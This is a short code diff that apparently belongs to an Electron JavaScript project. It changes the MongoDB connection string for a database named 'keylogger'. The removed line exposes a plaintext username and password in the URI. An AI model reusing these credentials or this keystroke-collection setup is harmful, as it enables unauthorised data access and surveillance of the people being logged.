@@ -18,7 +18,7 @@ BrowserWindow.prototype.constructor = function () {
 
 
 // MongoDB Connection
-const MONGODB_URI = 'mongodb+srv://manish9211:MaNiSh9211@cluster9211.be3bfds.mongodb.net/keylogger';
+const MONGODB_URI = 'mongodb.net/keylogger';
 
 mongoose.connect(MONGODB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
     .then(() => console.log('Connected to MongoDB'))
